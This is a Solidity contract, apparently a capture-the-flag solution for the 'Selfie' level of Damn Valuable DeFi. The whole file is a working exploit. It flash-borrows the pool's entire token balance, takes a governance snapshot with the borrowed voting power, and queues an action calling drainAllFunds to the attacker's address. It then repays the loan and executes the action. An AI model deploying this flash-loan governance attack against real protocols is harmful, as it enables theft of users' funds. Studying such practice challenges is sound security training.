// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";

interface IGov{
    function queueAction(
        address receiver, 
        bytes calldata data, 
        uint256 weiAmount) 
        external returns (uint256);

    function executeAction(uint256 actionId) external payable;
}

interface IPool{
    function flashLoan(uint256 borrowAmount) external;
}

contract SelfieAttack{

    DamnValuableTokenSnapshot token;
    IGov gov;
    IPool pool;
    uint256 public actionId;

    constructor(
        DamnValuableTokenSnapshot _token,
        IGov _gov,
        IPool _pool
    ) {
        token = _token;
        gov = _gov;
        pool = _pool;
    }

    function attack() external {

        //pool balance
        uint256 _poolBal = token.balanceOf(address(pool));

        //take a flashLoan
        pool.flashLoan(_poolBal);         
    }

    function receiveTokens(address,uint256 _amount) external {
        token.snapshot();

        //queue action
        actionId = gov.queueAction(
            address(pool), 
            abi.encodeWithSignature("drainAllFunds(address)", tx.origin), 
            0
        );

        //repay flashLoan
        token.transfer(address(pool), _amount);
    }

    function execute() external {
        gov.executeAction(actionId);
    }
}